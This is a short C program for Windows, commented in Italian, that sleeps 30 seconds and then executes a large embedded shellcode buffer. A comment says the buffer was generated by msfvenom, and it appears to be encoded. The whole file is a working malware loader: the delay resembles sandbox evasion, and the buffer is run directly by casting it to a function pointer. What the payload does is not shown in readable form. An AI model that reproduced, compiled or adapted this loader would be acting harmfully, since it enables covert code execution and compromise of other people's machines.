#include <windows.h>  // Libreria necessaria per la funzione Sleep()

int main() {
    // Aggiunge un ritardo di 30 secondi (30000 millisecondi)
    Sleep(30000);

    // Shellcode generato da msfvenom
    unsigned char buf[] =
    "\xb9\x7f\x01\x00\x00\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
"\x13\x72\x81\x18\x8a\x83\xeb\xfc\xe2\xf4\xcb\xf8\x19\x8a"
"\x72\x58\xf6\x53\x06\xa5\xec\xd1\xf3\xf2\x0b\x14\x63\x38"
"\x19\x09\x99\x7d\xfa\x7e\x55\xe3\xa0\x8b\xec\x49\x4f\x52"
"\x98\xb4\x55\xd0\x6d\xe3\xb2\x06\x73\x59\x62\x08\x07\x6c"
"\x43\x7f\xd8\x62\x69\x48\x61\xd6\x86\x91\x15\x2b\x9c\x13"
"\xe0\x7c\x7b\x20\x63\x12\x64\xcb\x8a\xf3\x8a\xbc\xb0\x6a"
"\x74\x44\x09\xd4\x9b\x9d\x7d\x29\x81\x1f\x88\x7e\x66\x56"
"\xd3\x96\xce\xc7\xe2\xf1\x97\xb0\xa2\xb6\xef\xff\x1b\x0e"
"\x00\x26\x6f\xf3\x1a\xa4\x9a\xa4\xfd\x35\xad\x45\xd5\x7c"
"\xf0\x2b\x0c\x0b\x68\x3a\x7d\xc4\xd1\xb8\x92\x1d\xa5\x45"
"\x88\x9f\x50\x12\x6f\x5e\xe1\x10\x12\x47\x3a\x9d\x9e\x30"
"\xf2\x04\x0c\xaa\x4b\x88\xe3\x73\x3f\x75\xf9\xf1\xca\x22"
"\x1e\x62\x75\x15\x48\x29\xa0\xad\xef\x5e\x3a\x20\x48\xef"
"\x83\xb6\xa7\x36\xf7\x4b\xbd\xb4\x02\x1c\x5a\x47\x41\xcb"
"\x40\x6c\x68\x93\xab\x1b\x92\xe4\xec\xe6\x2b\x74\x03\x3f"
"\x5f\x89\x19\xbd\xaa\xde\xfe\xc2\x4a\x72\x1c\x65\xc0\x51"
"\x0f\x12\xb6\x8f\x33\x17\x0f\x15\xdc\xce\x7b\xe8\xc6\x4c"
"\x8e\xbf\x21\xe5\x49\x46\x98\x94\xe4\x30\xd0\xe3\x44\xb7"
"\xb9\xbd\xfd\x53\x56\x64\x89\xae\x4c\xe6\x7c\xf9\xab\xd5"
"\xef\xdb\xc5\x3e\x16\x76\x5a\x49\x2c\xaf\xe8\xc0\x95\x41"
"\x07\x19\xe1\xbc\x1d\x9b\x14\xeb\xfa\x3c\x9a\x64\xb1\x43"
"\x7e\x64\x0b\x34\xd0\xa6\x14\x98\x69\x4e\xfb\x41\x1d\xb3"
"\xe1\xc3\xe8\xe4\x06\x34\x91\xa8\xb3\x1b\x82\x6b\xf7\x6c"
"\x7c\x44\x2b\x3e\xc5\xb6\xc4\xe7\xb1\x4b\xde\x65\x44\x1c"
"\x39\x26\x26\x95\xfd\xbd\x2e\x93\xc8\xca\x64\xa9\xd1\xe9"
"\xdd\x55\x3e\x30\xa9\xa8\x24\xb2\x5c\xff\xc3\x08\x61\xa2"
"\x2e\x6a\x36\x70\x32\x1d\x85\x2f\xff\x17\x3c\xe9\x10\xce"
"\x48\x14\x0a\x4c\xbd\x43\xed\xb1\x59\x7c\x70\x94\xd7\xcc"
"\x1c\xe3\x23\x4c\xb3\x99\x9a\x8c\x5c\x40\xee\x71\x46\xc2"
"\x1b\x26\xa1\x53\xe2\x7e\x58\x1a\x71\xa9\x50\x6d\xe9\x3e"
"\x98\x73\x50\xf4\x77\xaa\x24\x09\x6d\x28\xd1\x5e\x8a\x90"
"\xc2\x78\xdb\xf0\xbb\xd1\x7b\x87\x0a\xb2\xcd\x31\xb3\x66"
"\x22\xe8\xc7\x9b\x38\x6a\x32\xcc\xdf\xeb\xbe\xd9\x24\xb2"
"\x58\x43\x2e\xc5\xd0\xb5\xab\xd9\x69\x6b\x44\x00\x1d\x96"
"\x5e\x82\xe8\xc1\xb9\x19\x70\x8a\xc7\x5a\x82\x4e\x48\x2d"
"\x10\xaa\x93\xb4\xa9\x72\x7c\x6d\xdd\x8f\x66\xef\x28\xd8"
"\x81\x7b\x96\xf1\x51\x37\x42\x57\x70\x40\x4f\x5d\x79\x8c"
"\xbf\x7a\x11\x03\x42\x60\x93\xf6\x15\x87\x87\x53\xb0\xf5"
"\x4b\x9c\x9a\x76\x3c\x0b\x8b\xf3\x5c\xe1\xac\x9b\xdd\x1c"
"\xb6\x19\x28\x4b\x51\x95\x38\x9f\x92\xc1\x42\xc4\xa0\xb6"
"\x4d\x60\x54\x7d\xa7\x47\x3c\xe6\x5a\x5d\xbe\x13\x0d\xba"
"\x51\x05\xf6\x03\x66\x79\x82\x4b\x11\x0d\x20\x90\xa6\xff"
"\x07\xf8\x3b\x02\x1d\x7a\xce\x55\xfa\xcf\xfa\xab\x3d\xa2"
"\xa4\xda\x0b\xd5\x92\x5a\xd5\x16\x78\x7d\xbd\x81\x85\x67"
"\x3f\x74\xd2\x80\x0c\xf1\x3a\x29\xe7\x1e\x5d\x71\x90\xb6"
"\x6c\xb9\x03\x44\x4b\xd1\xaa\xb9\x51\x53\x5f\xee\xb6\x55"
"\xec\xf6\x09\x8b\x35\x61\x47\xfc\xb2\x66\x7f\x73\x5a\x41"
"\x17\xd0\xa7\x5b\x95\x25\xf0\xbc\x45\x4e\xf0\x27\x4d\x4f"
"\x7f\x4d\x3a\x1e\xa0\x6d\x97\xf6\x87\x05\x32\x0b\x9d\x87"
"\xc7\x5c\x7a\x7b\xbd\x3e\xed\x5f\xad\xd3\x8b\x28\xca\x1d"
"\xc9\x93\x38\x3a\xa1\x2c\xc5\x20\x23\xd9\x92\xc7\x0a\x71"
"\x2e\x72\xfb\xb3\x1d\x36\x8c\x19\x01\xaa\x1b\xf3\x26\xc2"
"\xaa\x0e\x3c\x40\x5f\x59\xdb\x6b\xa3\x05\x6f\x98\x35\xd6"
"\x2a\xef\x85\x9e\x56\x03\x77\xb9\x3e\xc8\x8a\xa3\xbc\x3d"
"\xdd\x44\x92\xd9\x52\x9c\x64\x57\x52\xb5\x13\xfa\x02\x1a"
"\x95\x10\x25\x72\x58\xed\x3f\xf0\xad\xba\xd8\x54\x6a\x79"
"\x5b\x28\xc7\x35\x29\x5f\xe2\x46\xca\x88\x0a\x61\xa2\x4f"
"\xf7\x7b\x20\xba\xa0\x9c\x1a\xc5\x32\x2c\xf8\xd0\x2f\x6d"
"\x8f\x71\xe4\xdf\x75\x83\xc3\xb7\xac\x7e\xd9\x35\x59\x29"
"\x3e\xb6\xbc\xb0\x74\xed\x33\xa6\xcf\x9a\x33\xf7\x76\x90"
"\xd9\xd0\x1e\x43\x24\xca\x9c\xb6\x73\x2d\x5b\xf0\xca\x05"
"\x44\xdc\xfc\xdc\x33\x82\x0e\x45\x5d\x72\x29\x2d\x88\x8f"
"\x33\xaf\x7d\xd8\xd4\x4a\xec\x6d\x72\x77\x17\x57\x25\x00"
"\x71\x72\xb0\xda\x9b\x55\xd8\x35\x66\x4f\x5a\xc0\x31\xa8"
"\xf0\xa5\x68\x51\x82\xaa\xbe\x59\xf5\x99\x6f\x20\x7e\x69"
"\x48\x48\x9f\x94\x52\xca\x6a\xc3\xb5\x13\x00\x0c\xa9\x12"
"\x00\x4c\x44\x65\x58\x92\xab\x11\xb0\xb5\xc3\xea\x4d\xaf"
"\x41\x1f\x1a\x48\x9e\xf1\xa6\xd1\x99\x75\x95\xb9\xee\x29"
"\xcf\x25\x19\xc3\xe8\x4d\xe4\x3e\xf2\xcf\x11\x69\x15\x0f"
"\xc3\x1c\xe2\x17\x7b\xe6\xe4\x60\x22\x80\xb1\xf3\xd2\xa7"
"\xd9\x04\x2f\xbd\x5b\xf1\x78\x5a\xbe\xa8\x88\x81\x83\x9b"
"\xf7\xab\xf4\xa4\xae\x93\x11\x20\x0a\xbe\xec\x3a\x88\x4b"
"\xbb\xdd\x46\x5a\x61\x9d\x50\x21\x34\x2c\x27\x35\x2f\x3e"
"\x59\xb1\x81\x13\xa4\xab\x03\xe6\xf3\x4c\x06\x6b\xe2\x60"
"\xdb\x8c\x7c\xbd\xac\x53\xfd\x64\xbe\xd7\x55\x49\x43\xcd"
"\xd7\xbc\x14\x2a\x9e\xb8\x3b\xd0\x0f\xd6\x9b\xdb\x78\x45"
"\x89\x3c\xbc\xc1\x3b\x11\x41\xdb\xb9\xe4\x16\x3c\x37\xc0"
"\x62\x86\x61\x8e\x99\xcd\x16\xda\xa5\x71\x92\x5e\x19\x5c"
"\x6f\x44\x9b\xa9\x38\xa3\x33\x7b\x89\x56\x43\xc3\xb7\x52"
"\x34\xb1\x47\x2b\xff\x35\xc1\x06\x02\x2f\x43\xf3\x55\xc8"
"\xef\xda\x3e\xd7\x9b\x99\xda\x39\xec\xef\xd7\x9a\xcd\x6b"
"\x57\xb7\x30\x71\xd5\x42\x67\x96\x88\x13\x8d\xfc\x0d\x28"
"\xe8\x67\x7a\x39\x2c\x93\xf7\xc5\xc4\x7c\x7e\x20\xf5\xce"
"\x93\x4e\x96\x2c\x7c\x97\xc8\x97\xa5\xd1\x4f\x6e\xdf\xf4"
"\x3b\x13\x40\x8f\xe2\x2d\x37\x69\xf8\x7d\x8b\xc7\xe8\x3c"
"\x36\x0a\xc9\x1d\x30\x8c\xb1\xf3\xa5\x92\x4f\x4e\xe7\x4e"
"\x86\x20\xf6\x15\x4f\x5c\x8f\x40\x04\x68\xbb\xc4\x14\x97"
"\xbf\xdd\x94\x97\xaf\xe5\xc5\xcf\x72\x0c\xb0\x20\xbe\xf4"
"\x3b\x97\xc3\x4e\xc5\xca\xc6\x05\x05\xd3\xfa\x69\xc5\xdb"
"\xcf\x25\xb1\xe8\xf4\xb8\x3c\x27\x8a\xe1\xb1\xfc\xaf\x4e"
"\x9c\x38\xf6\x16\xa2\x97\xfb\x8e\x4f\x44\xeb\xc4\x17\x97"
"\xf3\x4e\xc5\xcc\x7e\x81\xe0\x38\xac\x9e\xa5\x45\xad\x94"
"\x3b\xfc\xaf\x9a\x9e\x97\xe5\x2c\x44\xe3\x08\x3a\x99\x74"
"\xc4\xf7\xc4\x1c\x9f\xb2\xb7\x2e\xa8\x91\xac\x50\x80\xe3"
"\xc3\x95\x1f\x3a\x14\xa4\x67\xc4\xc4\x1c\xde\x01\x90\x4c"
"\x9f\xec\x44\x77\xf7\x3a\x11\x76\xfd\xad\x04\xb4\xc5\x59"
"\xac\x1e\xf7\xd4\x98\x95\x11\x95\x94\x4c\xa7\x85\x94\x5c"
"\xa7\xad\x2e\x13\x28\x25\x3b\xc9\x60\xaf\xd4\x4a\xa0\xad"
"\x5d\xb9\x83\xa4\x3b\xc9\x72\x05\xb0\x16\x08\x8b\xcc\x69"
"\x1b\x2d\xa3\x1c\xf7\xc5\xae\x1c\x9d\xc1\x92\x4b\x9f\xc7"
"\x1d\xd4\xa8\x3a\x11\x9f\x0f\xc5\xba\x2a\x7c\xf3\xae\x5c"
"\x9f\xc5\xd4\x1c\xf7\x93\xae\x1c\x9f\x9d\x60\x4f\x12\x3a"
"\x11\x8f\xa4\xaf\xc4\x4a\xa4\x92\xac\x1e\x2e\x0d\x9b\xe3"
"\x22\x46\x3c\x1c\x8a\xed\x9c\x74\xf7\x85\xc4\x1c\x9d\xc5"
"\x94\x74\xfc\xea\xcb\x2c\x08\x10\x93\x74\x82\xab\x89\x7d"
"\x08\x10\x9a\x42\x08\xc9\xe0\x13\x72\xb5\x3b\xe3\x08\x2c"
"\x5f\xe3\x08\x3a\xc5\xdf\xde\x03\xb1\xdd\x34\x7e\x34\xa9"
"\x55\x93\xae\x1c\xa4\x3a\x11\x1c\xf7\xc3\x14\x72\x26\x28"
"\x4b\x65\x65\x3d\x67\x67\x80\xca\xc8\x70\x90\x9e\xeb\x41"
"\xfc\x37\xd8\x3b\x2c\xbc\xde\x58\x46\xa4\xde\xf5\x4f\x92"
"\xa9\x77"
    ;
    

    // Cast del buffer a una funzione e la sua esecuzione
    void (*payload)() = (void (*)())buf;
    payload();

    return 0;
}
